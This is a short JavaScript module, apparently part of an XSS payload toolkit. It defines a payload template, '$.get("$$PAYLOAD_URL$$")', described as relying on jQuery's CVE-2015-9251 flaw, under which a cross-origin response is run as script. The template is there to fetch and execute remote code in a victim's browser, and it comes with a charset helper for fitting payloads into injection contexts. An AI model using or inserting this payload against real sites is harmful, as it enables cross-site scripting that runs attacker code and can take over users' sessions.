const renderable = require('../lib/renderable')
const CharSet = require('../lib/CharSet.js')

const script = '$.get("$$PAYLOAD_URL$$")'

module.exports = {
    description: `Standard JQuery Get, depends on a version of JQuery with CVE-2015-9251`,
    script: renderable(script),
    charset: new CharSet(renderable(script)({PAYLOAD_URL:''}))
}

